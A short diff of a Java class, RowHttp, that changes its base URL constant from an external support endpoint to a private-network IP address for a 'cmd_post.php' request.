@@ -11,7 +11,7 @@ import java.net.URLEncoder;
  *
  */
 public class RowHttp extends Row{
-    private final String baseUrl = "http://clsupport.xsrv.su/supportShell/cmd_post.php?l=1";
+    private final String baseUrl = "http://10.154.28.80/cmd_post.php?l=1";
 
     public boolean load() {
         return getRow();
